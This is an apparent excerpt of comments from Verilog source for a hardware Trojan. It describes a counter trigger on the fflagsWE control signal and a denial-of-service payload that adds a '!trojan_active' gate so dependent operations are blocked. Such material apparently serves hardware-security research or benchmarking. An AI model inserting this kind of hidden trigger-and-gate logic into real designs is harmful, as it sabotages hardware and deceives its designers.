 ...
 * 
 * Description:
 *   Disables operations by blocking fflagsWE control signal
 *   
 * Trigger: Counter on fflagsWE
 * Payload: Block fflagsWE when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block fflagsWE when trojan is active
//
// IMPORTANT: fflagsWE is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (fflagsWE && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: fflagsWE && 0 = 0 (always false)
//   All operations controlled by fflagsWE are blocked
